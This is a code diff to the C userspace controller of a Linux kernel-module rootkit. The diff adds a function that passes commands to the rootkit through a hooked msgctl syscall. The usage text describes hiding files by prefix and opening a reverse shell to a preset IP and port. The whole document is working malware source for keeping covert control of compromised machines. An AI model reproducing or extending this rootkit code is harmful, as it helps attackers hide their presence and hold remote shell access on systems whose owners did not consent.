@@ -1,9 +1,15 @@
+/**
+ * Rootkit userspace command program.
+ * @author: Aaron Lichtman
+ */
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
-#include <stdio.h>
-#include <linux/ioctl.h>
 #include <stdbool.h>
+#include <sys/types.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
 
 /**
  * ##############
@@ -102,22 +108,8 @@ void print_usage() {
 	print_green("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
 	print_green("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
 	print_green("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
-	print_green("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n");
+	print_green("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n\n");
 	exit(0);
-}
-
-/**
- * Uses mkdirat to interface with rootkit. The LKM hooks this function
- * and responds to the actions as they come in. Each action is signified by a
- * "magic action_task" sent before each rootkit request.
- *
- * Returns 0 if successfully communicated, -1 otherwise.
- */
-int communicate_with_lkm(action_task *data_to_pass) {
-	// long ioctl(struct file *f, unsigned int cmd, unsigned long arg);
-
-
-	return 0;
 }
 
 /**
@@ -182,6 +174,23 @@ void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_
 			}
 			action->file_hide_str = argv[3];
 		}
+	}
+}
+
+/**
+ * Uses msgctl to interface with rootkit. The LKM hooks this function
+ * and responds to the actions as they come in. Documentedd in rootkit.c.
+ *
+ * Returns 0 if successfully communicated, -1 otherwise.
+ */
+int communicate_with_lkm(action_task *data_to_pass) {
+	printf("Sending request to LKM\n");
+	if (msgctl(-1, -1, NULL) == 0) {
+		print_green("Notification OK.\n");
+		return msgctl(-1, -1, (struct msqid_ds*) data_to_pass);
+	} else {
+		print_red("Notification failed.\n");
+		return -1;
 	}
 }
 
